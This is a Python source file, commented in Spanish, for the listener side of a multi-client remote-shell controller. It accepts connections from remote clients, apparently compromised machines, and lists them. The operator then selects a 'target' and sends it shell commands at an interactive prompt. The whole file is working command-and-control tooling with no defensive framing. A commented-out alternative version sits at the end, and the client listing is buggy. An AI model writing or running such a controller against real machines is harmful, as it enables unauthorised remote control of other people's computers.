import socket
import sys
#from multiprocessing import Process
import time
from queue import Queue
import threading

THREADS = 2
JOBS = [1, 2]
conexiones = []
direcciones = []
queue = Queue()


    # crea un socket
def crear_socket():
    try:
        global host,port,s
        host = ''
        port = int(sys.argv[1])
        s =socket.socket()
    except socket.error as msg:
        return (f' Error al crear socket: {msg}')

#binding el socket y escuchando conexiones
def bind_socket():
    try:
        global host,port,s
        print(f'Binding el puerto {port}')

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print(f' Error al binding el socket: {msg}, reintentando...')
        bind_socket()

#manejando multiples conexiones con clientes
def aceptar_conexiones():
    for c in conexiones:
        c.close()
    del conexiones[:]
    del direcciones[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(True) #previene el time out
            conexiones.append(conn)
            direcciones.append(address)
            print(conexiones)
            print(direcciones)
            print(f'La conexion ha sido establecida: {address[0]}')
        except:
            print('Error aceptando conexiones')
# ver todos los clientes, seleccionar cliente, enviar comandos

def lista_de_conexiones():
    resultado = ''
    for i, conn in enumerate(conexiones):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del conexiones[i]
            del direcciones[i]
            continue

        resultado = str(i) + '   ' + str(direcciones[i][0]) + '   ' + str(direcciones[i][1]) + '\n'
        #resultado =conexiones[i][0])
    print('-----Cliente-----' + '\n'+str(resultado))



def seleccionar_objetivo(cmd):
    try:
        objetivo = cmd.replace('select ','')
        objetivo = int(objetivo)
        conn = conexiones[objetivo]
        print(f'Estas conectado a: {direcciones[objetivo][0]}')
        print(str(direcciones[objetivo][0]) + '>', end='')
        return conn
    except:
        print('Seleccion no valida')
        return None

def enviar_comando(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'salir':
                break

            if len(str.encode(cmd)) > 0: # quiere decir que se tipeo algo
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),'utf-8')
                print(client_response, end='')
        except:
            print('Error enviando comando')
            break

def start_turtle():
    while True:
        cmd = input('1kp0> ')
        if cmd == 'list':
            lista_de_conexiones()
        elif 'select' in cmd:
            conn = seleccionar_objetivo(cmd)
            if conn is not None:
                enviar_comando(conn)
        else:
            print('Comando no reconocido')

def work1():
    while True:
        crear_socket()
        bind_socket()
        aceptar_conexiones()

def work2():
    while True:
        start_turtle()



t1 = threading.Thread(target=work1)
t2 = threading.Thread(target=work2)
t1.start()
t2.start()
try:
    t1.join()
    t2.join()
except:
    pass

'''
        
        def crear_workers():
            for _ in range(THREADS):
                t = threading.Thread(target=work)
                t.daemon = True
                t.start()
        
        def work():
            while True:
                x = queue.get()
                if x == 1:
                    #start.crear_socket()
                    crear_socket()
                    bind_socket()
                    aceptar_conexiones()
                if x == 2:
                    start_turtle()
                queue.task_done()
        
        def crear_jobs():
            for x in JOBS:
                queue.put(x)
        
            queue.join()
        
        
        crear_workers()
        crear_jobs()


'''
